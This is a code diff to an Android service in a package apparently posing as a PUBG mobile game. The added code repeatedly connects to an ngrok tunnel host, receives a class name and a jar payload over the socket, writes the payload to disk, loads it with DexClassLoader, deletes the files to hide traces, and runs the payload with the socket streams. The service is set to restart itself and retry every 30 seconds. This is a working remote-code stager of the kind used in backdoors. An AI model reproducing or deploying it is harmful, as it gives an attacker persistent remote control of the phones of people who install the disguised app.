@@ -1,6 +1,7 @@
 package com.pubg.imobile;
 
 import static com.pubg.imobile.Cheetah.params;
+import static com.pubg.imobile.Trigger.session_expiry;
 
 import android.app.Service;
 import android.content.Context;
@@ -9,12 +10,17 @@ import android.os.IBinder;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.OutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
+
+import dalvik.system.DexClassLoader;
 
 public class Job extends Service {
     private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
@@ -31,14 +37,12 @@ public class Job extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         Cheetah.start(this);
         Attempt();
-        Cheetah.start(this);
         return START_STICKY;
     }
 
     public void Attempt() {
-        long initialDelay = 10; // Delay before the first execution (in seconds)
-        long period = 10;       // Period between subsequent executions (in seconds)
-
+        long initialDelay = 30; // Delay before the first execution (in seconds)
+        long period = 30;       // Period between subsequent executions (in seconds)
         scheduler.scheduleAtFixedRate(() -> Cheetah.start(getApplicationContext()), initialDelay, period, TimeUnit.SECONDS);
     }
 
@@ -48,7 +52,7 @@ public class Job extends Service {
     }
 
     static void MainBridge() throws Exception {
-        int port = 14592;
+        int port = 10952;
         String host = "0.tcp.in.ngrok.io";
         try {
             if (host.equals("")) {
@@ -65,10 +69,49 @@ public class Job extends Service {
 
         if (sock != null) {
             try {
-                Cheetah.readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), params);
+                readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), params);
             } catch (IOException e) {
                 e.printStackTrace(); // Handle the exception
             }
         }
+    }
+
+    public static void readAndRunStage(DataInputStream input, OutputStream output, String[] args) throws Exception {
+        String dirPath = args[0];
+        String jarFilePath = dirPath + File.separatorChar + "Runner.jar";
+        String dexFilePath = dirPath + File.separatorChar + "Runner.dex";
+
+        int coreSize1 = input.readInt();
+        byte[] coreData1 = new byte[coreSize1];
+        input.readFully(coreData1);
+
+        String className = new String(coreData1);
+
+        int coreSize2 = input.readInt();
+        byte[] coreData2 = new byte[coreSize2];
+        input.readFully(coreData2);
+
+        File jarFile = new File(jarFilePath);
+
+        if (!jarFile.exists()) {
+            jarFile.createNewFile();
+        }
+
+        FileOutputStream fileOutputStream = new FileOutputStream(jarFile);
+        fileOutputStream.write(coreData2);
+        fileOutputStream.flush();
+        fileOutputStream.close();
+
+        Class<?> loadedClass = new DexClassLoader(jarFilePath, dirPath, dirPath, Cheetah.class.getClassLoader()).loadClass(className);
+
+        Object stageInstance = loadedClass.newInstance();
+
+        jarFile.delete();
+        new File(dexFilePath).delete();
+
+        loadedClass.getMethod("start", DataInputStream.class, OutputStream.class, String[].class)
+                .invoke(stageInstance, input, output, args);
+
+        session_expiry = -1;
     }
 }
